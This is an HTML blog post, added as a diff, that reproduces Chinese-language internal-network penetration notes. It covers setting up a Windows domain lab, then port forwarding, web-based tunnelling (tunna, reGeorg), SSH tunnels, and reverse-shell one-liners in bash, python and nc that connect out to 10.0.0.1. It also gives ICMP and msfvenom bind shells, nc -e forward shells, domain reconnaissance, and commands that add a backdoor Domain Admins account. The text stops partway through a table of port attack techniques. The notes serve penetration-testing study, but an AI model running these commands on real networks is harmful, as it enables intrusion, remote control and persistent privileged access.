@@ -1,0 +1,1168 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          内网渗透 - Rootclay
+        
+    </title>
+
+    <link rel="canonical" href="http://rootclay.github.io/2017/05/29/内网/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('header.png')
+            /*post*/
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Web" title="Web">Web</a>
+                            
+                        </div>
+                        <h1>内网渗透</h1>
+                        <h2 class="subheading">转自小组学长内网学习笔记.</h2>
+                        <span class="meta">
+                            Posted by Rootclay on
+                            2017-05-29
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">ROOTCLAY</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <p>Team:Syclover<br>
+Author:L3m0n</p>
+<h2 id="域环境搭建">域环境搭建</h2>
+<p>准备：<br>
+DC: win2008<br>
+DM: win2003<br>
+DM: winxp</p>
+<hr>
+<p>win2008(域控)<br>
+1、修改计算机名：<br>
+<img src="./pic/1_domain/1.jpg" alt=""></p>
+<p>2、配置固定ip:<br>
+其中网关设置错误，应该为192.168.206.2，开始默认的网管<br>
+<img src="./pic/1_domain/2.jpg" alt=""></p>
+<p>3、服务器管理器—角色：<br>
+<img src="./pic/1_domain/3.jpg" alt=""></p>
+<p>4、配置域服务:<br>
+dos下面输入<code>dcpromo</code><br>
+<img src="./pic/1_domain/4.jpg" alt=""></p>
+<p>Ps：这里可能会因为本地administrator的密码规则不合要求，导致安装失败，改一个强密码</p>
+<p>5、设置林根域：<br>
+林就是在多域情况下形成的森林,根表示基础,其他在此根部衍生<br>
+具体见：<a href="http://angerfire.blog.51cto.com/198455/144123/" target="_blank" rel="external">http://angerfire.blog.51cto.com/198455/144123/</a><br>
+<img src="./pic/1_domain/5.jpg" alt=""></p>
+<p>6、<strong>域数据存放的地址</strong><br>
+<img src="./pic/1_domain/6.jpg" alt=""></p>
+<hr>
+<p>win2003、winxp和08配置差不多</p>
+<p>注意点是：<br>
+1、配置网络<br>
+dns server应该为主域控ip地址<br>
+<img src="./pic/1_domain/7.jpg" alt=""></p>
+<p>2、加入域控<br>
+<img src="./pic/1_domain/8.jpg" alt=""></p>
+<hr>
+<p>域已经搭建完成，主域控会生成一个<code>krbtgt</code>账号<br>
+他是Windows活动目录中使用的客户/服务器认证协议，为通信双方提供双向身份认证<br>
+<img src="./pic/1_domain/9.jpg" alt=""></p>
+<p>参考：<br>
+AD域环境的搭建 基于Server 2008 R2<br>
+<a href="http://www.it165.net/os/html/201306/5493.html" target="_blank" rel="external">http://www.it165.net/os/html/201306/5493.html</a><br>
+Acitve Directory 域环境的搭建<br>
+<a href="http://blog.sina.com.cn/s/blog_6ce0f2c901014okt.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_6ce0f2c901014okt.html</a></p>
+<h2 id="端口转发ampamp边界代理">端口转发&amp;&amp;边界代理</h2>
+<p>此类工具很多，测试一两个经典的。</p>
+<h3 id="端口转发">端口转发</h3>
+<p>1、windows<br>
+lcx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">监听1234端口,转发数据到2333端口</div><div class="line">本地:lcx.exe -listen 1234 2333</div><div class="line"></div><div class="line">将目标的3389转发到本地的1234端口</div><div class="line">远程:lcx.exe -slave ip 1234 127.0.0.1 3389</div></pre></td></tr></table></figure>
+<p>netsh<br>
+只支持tcp协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">添加转发规则</div><div class="line">netsh interface portproxy set v4tov4 listenaddress=192.168.206.101 listenport=3333 connectaddress=192.168.206.100 connectport=3389</div><div class="line">此工具适用于，有一台双网卡服务器，你可以通过它进行内网通信，比如这个，你连接192.168.206.101:3388端口是连接到100上面的3389</div><div class="line"></div><div class="line">删除转发规则</div><div class="line">netsh interface portproxy delete v4tov4 listenport=9090</div><div class="line"></div><div class="line">查看现有规则</div><div class="line">netsh interface portproxy show all</div><div class="line"></div><div class="line">xp需要安装ipv6</div><div class="line">netsh interface ipv6 install</div></pre></td></tr></table></figure>
+<p><img src="./pic/3_proxy/7.jpg" alt=""></p>
+<p>更加详细参考：<a href="http://aofengblog.blog.163.com/blog/static/631702120148573851740/" target="_blank" rel="external">http://aofengblog.blog.163.com/blog/static/631702120148573851740/</a></p>
+<p>2、linux<br>
+portmap<br>
+<img src="./pic/3_proxy/2.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">监听1234端口,转发数据到2333端口</div><div class="line">本地:./portmap -m 2 -p1 1234 -p2 2333</div><div class="line"></div><div class="line">将目标的3389转发到本地的1234端口</div><div class="line">./portmap -m 1 -p1 3389 -h2 ip -p2 1234</div></pre></td></tr></table></figure>
+<p>iptables</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">1、编辑配置文件/etc/sysctl.conf的net.ipv4.ip_forward = 1</div><div class="line"></div><div class="line">2、关闭服务</div><div class="line">service iptables stop</div><div class="line"></div><div class="line">3、配置规则</div><div class="line">需要访问的内网地址：192.168.206.101</div><div class="line">内网边界web服务器：192.168.206.129</div><div class="line">iptables -t nat -A PREROUTING --dst 192.168.206.129 -p tcp --dport 3389 -j DNAT --to-destination 192.168.206.101:3389</div><div class="line"></div><div class="line">iptables -t nat -A POSTROUTING --dst 192.168.206.101 -p tcp --dport 3389 -j SNAT --to-source 192.168.206.129</div><div class="line"></div><div class="line">4、保存&amp;&amp;重启服务</div><div class="line">service iptables save &amp;&amp; service iptables start</div></pre></td></tr></table></figure>
+<h3 id="socket代理">socket代理</h3>
+<p>xsocks<br>
+1、windows<br>
+<img src="./pic/3_proxy/3.jpg" alt=""></p>
+<p>进行代理后，在windows下推荐使用Proxifier进行socket连接，规则自己定义<br>
+<img src="./pic/3_proxy/4.jpg" alt=""></p>
+<p>2、linux<br>
+进行代理后，推荐使用proxychains进行socket连接<br>
+kali下的配置文件：<br>
+/etc/proxychains.conf<br>
+添加一条：socks5 	127.0.0.1 8888</p>
+<p>然后在命令前加proxychains就进行了代理<br>
+<img src="./pic/3_proxy/5.jpg" alt=""></p>
+<h3 id="神器推荐">神器推荐</h3>
+<p><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="external">http://rootkiter.com/EarthWorm/</a><br>
+跨平台+端口转发+socket代理结合体！darksn0w师傅的推荐。<br>
+ew_port_socket.zip</p>
+<h3 id="基于http的转发与socket代理低权限下的渗透">基于http的转发与socket代理(低权限下的渗透)</h3>
+<p>如果目标是在dmz里面，数据除了web其他出不来，便可以利用http进行<br>
+1、端口转发<br>
+tunna</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&gt;端口转发(将远程3389转发到本地1234)</div><div class="line">&gt;python proxy.py -u http://lemon.com/conn.jsp -l 1234 -r 3389 -v</div><div class="line">&gt;</div><div class="line">&gt;连接不能中断服务(比如ssh)</div><div class="line">&gt;python proxy.py -u http://lemon.com/conn.jsp -l 1234 -r 22 -v -s</div><div class="line">&gt;</div><div class="line">&gt;转发192.168.0.2的3389到本地</div><div class="line">&gt;python proxy.py -u http://lemon.com/conn.jsp -l 1234 -a 192.168.0.2 -r 3389</div></pre></td></tr></table></figure>
+<p>具体参考：<a href="http://drops.wooyun.org/tools/650" target="_blank" rel="external">http://drops.wooyun.org/tools/650</a></p>
+<p>2、socks代理<br>
+reGeorg</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -u http://192.168.206.101/tunnel.php -p 8081</div></pre></td></tr></table></figure>
+<p><img src="./pic/3_proxy/6.jpg" alt=""></p>
+<h3 id="ssh通道">ssh通道</h3>
+<p><a href="http://staff.washington.edu/corey/fw/ssh-port-forwarding.html" target="_blank" rel="external">http://staff.washington.edu/corey/fw/ssh-port-forwarding.html</a><br>
+1、端口转发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">本地访问127.0.0.1:port1就是host:port2(用的更多)</div><div class="line">ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发</div><div class="line"></div><div class="line">访问host:port2就是访问127.0.0.1:port1</div><div class="line">ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发</div><div class="line"></div><div class="line">可以将dmz_host的hostport端口通过remote_ip转发到本地的port端口</div><div class="line">ssh -qTfnN -L port:dmz_host:hostport -l user remote_ip   #正向隧道，监听本地port</div><div class="line"></div><div class="line">可以将dmz_host的hostport端口转发到remote_ip的port端口</div><div class="line">ssh -qTfnN -R port:dmz_host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类</div></pre></td></tr></table></figure>
+<p>2、socks</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">socket代理:</div><div class="line">ssh -qTfnN -D port remotehost</div></pre></td></tr></table></figure>
+<p><img src="./pic/3_proxy/8.jpg" alt=""></p>
+<p>参考redrain大牛的文章：<a href="http://drops.wooyun.org/tips/5234" target="_blank" rel="external">http://drops.wooyun.org/tips/5234</a></p>
+<h2 id="获取shell">获取shell</h2>
+<h3 id="常规shell反弹">常规shell反弹</h3>
+<p>几个常用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>、bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></div><div class="line"></div><div class="line"><span class="number">2</span>、python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></div><div class="line"></div><div class="line"><span class="number">3</span>、rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1234</span> &gt;/tmp/f</div></pre></td></tr></table></figure>
+<p>各种语言一句话反弹shell：<br>
+<a href="http://wiki.wooyun.org/pentest:%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9shell" target="_blank" rel="external">http://wiki.wooyun.org/pentest:各种语言一句话反弹shell</a></p>
+<h3 id="突破防火墙的imcp_shell反弹">突破防火墙的imcp_shell反弹</h3>
+<p>有时候防火墙可能对tcp进行来处理，然而对imcp并没有做限制的时候，就可以来一波~<br>
+kali运行(其中的ip地址填写为目标地址win03)：<br>
+<img src="./pic/3_proxy/9.jpg" alt=""></p>
+<p>win03运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">icmpsh.exe -t kali_ip -d 500 -b 30 -s 128</div></pre></td></tr></table></figure>
+<p>可以看到icmp进行通信的<br>
+<img src="./pic/3_proxy/10.jpg" alt=""></p>
+<h3 id="shell反弹不出的时候">Shell反弹不出的时候</h3>
+<p>主要针对：本机kali不是外网或者目标在dmz里面反弹不出shell，可以通过这种直连shell然后再通过http的端口转发到本地的metasploit</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">1、msfvenom -p windows/x64/shell/bind_tcp LPORT=12345 -f exe -o ./shell.exe</div><div class="line">先生成一个bind_shell</div><div class="line"></div><div class="line">2、本地利用tunna工具进行端口转发</div><div class="line">python proxy.py -u http://lemon.com/conn.jsp  -l 1111 -r 12345 v</div><div class="line"></div><div class="line">3、</div><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/x64/shell/bind_tcp</div><div class="line">set LPORT 1111</div><div class="line">set RHOST 127.0.0.1</div></pre></td></tr></table></figure>
+<p><img src="./pic/3_proxy/1.jpg" alt=""></p>
+<p>参考的文章：<br>
+<a href="https://www.91ri.org/11722.html" target="_blank" rel="external">https://www.91ri.org/11722.html</a></p>
+<h3 id="正向shell">正向shell</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1、nc -e /bin/sh -lp 1234</div><div class="line"></div><div class="line">2、nc.exe -e cmd.exe -lp 1234</div></pre></td></tr></table></figure>
+<h2 id="信息收集结构分析">信息收集(结构分析)</h2>
+<h3 id="基本命令">基本命令</h3>
+<p>1、获取当前组的计算机名(一般remark有Dc可能是域控)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;net view</div><div class="line">Server Name            Remark</div><div class="line"></div><div class="line">-----------------------------------------------------------------------------</div><div class="line">\\DC1</div><div class="line">\\DM-WINXP</div><div class="line">\\DM_WIN03</div><div class="line">The command completed successfully.</div></pre></td></tr></table></figure>
+<p>2、查看所有域</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;net view /domain</div><div class="line">Domain</div><div class="line"></div><div class="line">-----------------------------------------------------------------------------</div><div class="line">CENTOSO</div><div class="line">The command completed successfully.</div></pre></td></tr></table></figure>
+<p>3、从计算机名获取ipv4地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;ping -n 1 DC1 -4</div><div class="line"></div><div class="line">Pinging DC1.centoso.com [192.168.206.100] with 32 bytes of data:</div><div class="line"></div><div class="line">Reply from 192.168.206.100: bytes=32 time&lt;1ms TTL=128</div><div class="line"></div><div class="line">Ping statistics for 192.168.206.100:</div><div class="line">    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),</div><div class="line">Approximate round trip times in milli-seconds:</div><div class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</div></pre></td></tr></table></figure>
+<p>Ps:如果计算机名很多的时候，可以利用bat批量ping获取ip</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@echo off</span></div><div class="line">setlocal ENABLEDELAYEDEXPANSION</div><div class="line"><span class="meta">@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (</span></div><div class="line"><span class="meta">@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (</span></div><div class="line"><span class="meta">@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k  %%j)</span></div><div class="line">)</div><div class="line">)</div></pre></td></tr></table></figure>
+<p><img src="./pic/1_domain/10.jpg" alt=""></p>
+<hr>
+<p>以下执行命令时候会发送到域控查询,如果渗透的机器不是域用户权限,则会报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">The request will be processed at a domain controller for domain</div><div class="line">System error 1326 has occurred.</div><div class="line">Logon failure: unknown user name or bad password.</div></pre></td></tr></table></figure>
+<p>4、查看域中的用户名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">dsquery user</div><div class="line">或者：</div><div class="line">C:\Users\lemon\Desktop&gt;net user /domain</div><div class="line"></div><div class="line">User accounts for \\DC1</div><div class="line"></div><div class="line">-------------------------------------------------------------------------------</div><div class="line">Administrator            Guest                    krbtgt</div><div class="line">lemon                    pentest</div><div class="line">The command completed successfully.</div></pre></td></tr></table></figure>
+<p>5、查询域组名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">C:\Users\lemon\Desktop&gt;net group /domain</div><div class="line"></div><div class="line">Group Accounts for \\DC1</div><div class="line"></div><div class="line">----------------------------------------------</div><div class="line">*DnsUpdateProxy</div><div class="line">*Domain Admins</div><div class="line">*Domain Computers</div><div class="line">*Domain Controllers</div><div class="line">*Domain Guests</div><div class="line">*Domain Users</div><div class="line">*Enterprise Admins</div><div class="line">*Enterprise Read-only Domain Controllers</div><div class="line">*Group Policy Creator Owners</div><div class="line">*Read-only Domain Controllers</div><div class="line">*Schema Admins</div><div class="line">The command completed successfully.</div></pre></td></tr></table></figure>
+<p>6、查询域管理员</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">C:\Users\lemon\Desktop&gt;net group &quot;Domain Admins&quot; /domain</div><div class="line">Group name     Domain Admins</div><div class="line">Comment        Designated administrators of the domain</div><div class="line"></div><div class="line">Members</div><div class="line"></div><div class="line">-----------------------------------------------------------</div><div class="line">Administrator</div></pre></td></tr></table></figure>
+<p>7、添加域管理员账号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">添加普通域用户</div><div class="line">net user lemon iam@L3m0n /add /domain</div><div class="line">将普通域用户提升为域管理员</div><div class="line">net group &quot;Domain Admins&quot; lemon /add /domain</div></pre></td></tr></table></figure>
+<p>8、查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;net config Workstation</div><div class="line">Computer name                        \\DM_WIN03</div><div class="line">Full Computer name                   DM_win03.centoso.com</div><div class="line">User name                            Administrator</div><div class="line"></div><div class="line">Workstation active on</div><div class="line">        NetbiosSmb (000000000000)</div><div class="line">        NetBT_Tcpip_&#123;6B2553C1-C741-4EE3-AFBF-CE3BA1C9DDF7&#125; (000C2985F6E4)</div><div class="line"></div><div class="line">Software version                     Microsoft Windows Server 2003</div><div class="line"></div><div class="line">Workstation domain                   CENTOSO</div><div class="line">Workstation Domain DNS Name          centoso.com</div><div class="line">Logon domain                         DM_WIN03</div><div class="line"></div><div class="line">COM Open Timeout (sec)               0</div><div class="line">COM Send Count (byte)                16</div><div class="line">COM Send Timeout (msec)              250</div></pre></td></tr></table></figure>
+<p>9、查看域控制器(多域控制器的时候,而且只能用在域控制器上)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net group &quot;Domain controllers&quot;</div></pre></td></tr></table></figure>
+<p>10、查询所有计算机名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dsquery computer</div><div class="line">下面这条查询的时候,域控不会列出</div><div class="line">net group &quot;Domain Computers&quot; /domain</div></pre></td></tr></table></figure>
+<p>11、net命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&gt;1、映射磁盘到本地</div><div class="line">net use z: \\dc01\sysvol</div><div class="line"></div><div class="line">&gt;2、查看共享</div><div class="line">net view \\192.168.0.1</div><div class="line"></div><div class="line">&gt;3、开启一个共享名为app$，在d:\config</div><div class="line">&gt;net share app$=d:\config</div></pre></td></tr></table></figure>
+<p>12、跟踪路由</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tracert 8.8.8.8</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="定位域控">定位域控</h3>
+<p>1、查看域时间及域服务器的名字</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\Users\lemon\Desktop&gt;net time /domain</div><div class="line">Current time at \\DC1.centoso.com is 3/21/2016 12:37:15 AM</div></pre></td></tr></table></figure>
+<p>2、</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">C:\Documents and Settings\Administrator\Desktop&gt;Nslookup -type=SRV _ldap._tcp.</div><div class="line">*** Can&apos;t find server address for &apos;_ldap._tcp.&apos;:</div><div class="line">DNS request timed out.</div><div class="line">    timeout was 2 seconds.</div><div class="line">*** Can&apos;t find server name for address 192.168.206.100: Timed out</div><div class="line">Server:  UnKnown</div><div class="line">Address:  192.168.206.100</div><div class="line"></div><div class="line">*** UnKnown can&apos;t find -type=SRV: Non-existent domain</div></pre></td></tr></table></figure>
+<p>3、通过ipconfig配置查找dns地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ipconfig/all</div></pre></td></tr></table></figure>
+<p>4、查询域控</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net group &quot;Domain Controllers&quot; /domain</div></pre></td></tr></table></figure>
+<hr>
+<h3 id="端口收集">端口收集</h3>
+<p>端口方面的攻防需要花费的时间太多，引用一篇非常赞的端口总结文章</p>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>攻击技巧</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21/22/69</td>
+<td>ftp/tftp：文件传输协议</td>
+<td>爆破\嗅探\溢出\后门</td>
+</tr>
+<tr>
+<td>22</td>
+<td>ssh：远程连接</td>
+<td>爆破OpenSSH；28个退格</td>
+</tr>
+<tr>
+<td>23</td>
+<td>telnet：远程连接</td>
+<td>爆破\嗅探</td>
+</tr>
+<tr>
+<td>25</td>
